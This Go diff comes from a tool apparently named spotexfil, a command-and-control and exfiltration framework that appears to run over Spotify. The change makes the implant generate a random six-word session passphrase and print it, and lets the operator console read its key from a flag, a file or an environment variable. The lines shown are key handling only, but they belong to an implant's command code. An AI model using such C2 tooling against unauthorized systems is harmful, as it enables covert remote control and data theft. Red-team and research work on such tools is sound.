@@ -3,8 +3,11 @@ package main
 
 import (
 	"context"
+	crand "crypto/rand"
 	"fmt"
+	"math/big"
 	"os"
+	"strings"
 
 	"github.com/sourcefrenchy/spotexfil/internal/c2"
 	"github.com/sourcefrenchy/spotexfil/internal/encoding"
@@ -12,6 +15,28 @@ import (
 	"github.com/sourcefrenchy/spotexfil/internal/spotify"
 	"github.com/spf13/cobra"
 )
+
+var keyWords = []string{
+	"alpha", "bravo", "charlie", "delta", "echo", "foxtrot",
+	"golf", "hotel", "india", "juliet", "kilo", "lima",
+	"mike", "november", "oscar", "papa", "quebec", "romeo",
+	"sierra", "tango", "uniform", "victor", "whiskey", "xray",
+	"yankee", "zulu", "niner", "zero", "one", "two",
+	"three", "four", "five", "six", "seven", "eight",
+}
+
+// generatePassphrase generates a random 6-word passphrase using crypto/rand.
+func generatePassphrase() (string, error) {
+	words := make([]string, 6)
+	for i := range words {
+		idx, err := crand.Int(crand.Reader, big.NewInt(int64(len(keyWords))))
+		if err != nil {
+			return "", fmt.Errorf("crypto/rand failed: %w", err)
+		}
+		words[i] = keyWords[idx.Int64()]
+	}
+	return strings.Join(words, "-"), nil
+}
 
 var version = "1.0.0"
 
@@ -152,13 +177,20 @@ func cleanCmd() *cobra.Command {
 }
 
 func c2ImplantCmd() *cobra.Command {
-	var key string
 	var interval, jitter int
 
 	cmd := &cobra.Command{
 		Use:   "c2-implant",
 		Short: "Run C2 implant",
 		RunE: func(cmd *cobra.Command, args []string) error {
+			// Auto-generate a random passphrase
+			key, err := generatePassphrase()
+			if err != nil {
+				return fmt.Errorf("failed to generate key: %w", err)
+			}
+			fmt.Printf("[*] Session key: %s\n", key)
+			fmt.Printf("[*] Use this key to start the operator: ./spotexfil c2-operator -k \"%s\"\n", key)
+
 			cfg, err := spotify.LoadConfig()
 			if err != nil {
 				return err
@@ -175,22 +207,35 @@ func c2ImplantCmd() *cobra.Command {
 		},
 	}
 
-	cmd.Flags().StringVarP(&key, "key", "k", "", "Encryption passphrase")
 	cmd.Flags().IntVar(&interval, "interval", shared.Proto.C2.DefaultInterval, "Polling interval (seconds)")
 	cmd.Flags().IntVar(&jitter, "jitter", shared.Proto.C2.DefaultJitter, "Jitter range (seconds)")
-	cmd.MarkFlagRequired("key")
 
 	return cmd
 }
 
 func c2OperatorCmd() *cobra.Command {
-	var key string
+	var key, keyFile string
 	var pollInterval int
 
 	cmd := &cobra.Command{
 		Use:   "c2-operator",
 		Short: "Run C2 operator console",
 		RunE: func(cmd *cobra.Command, args []string) error {
+			// Resolve key: --key flag > --key-file > SPOTEXFIL_KEY env
+			if key == "" && keyFile != "" {
+				data, err := os.ReadFile(keyFile)
+				if err != nil {
+					return fmt.Errorf("read key file: %w", err)
+				}
+				key = strings.TrimSpace(string(data))
+			}
+			if key == "" {
+				key = os.Getenv("SPOTEXFIL_KEY")
+			}
+			if key == "" {
+				return fmt.Errorf("encryption key required: use -k, --key-file, or SPOTEXFIL_KEY env var")
+			}
+
 			cfg, err := spotify.LoadConfig()
 			if err != nil {
 				return err
@@ -208,8 +253,8 @@ func c2OperatorCmd() *cobra.Command {
 	}
 
 	cmd.Flags().StringVarP(&key, "key", "k", "", "Encryption passphrase")
+	cmd.Flags().StringVar(&keyFile, "key-file", "", "Path to file containing encryption passphrase")
 	cmd.Flags().IntVar(&pollInterval, "poll-interval", 30, "Background poll interval in seconds (default 30)")
-	cmd.MarkFlagRequired("key")
 
 	return cmd
 }
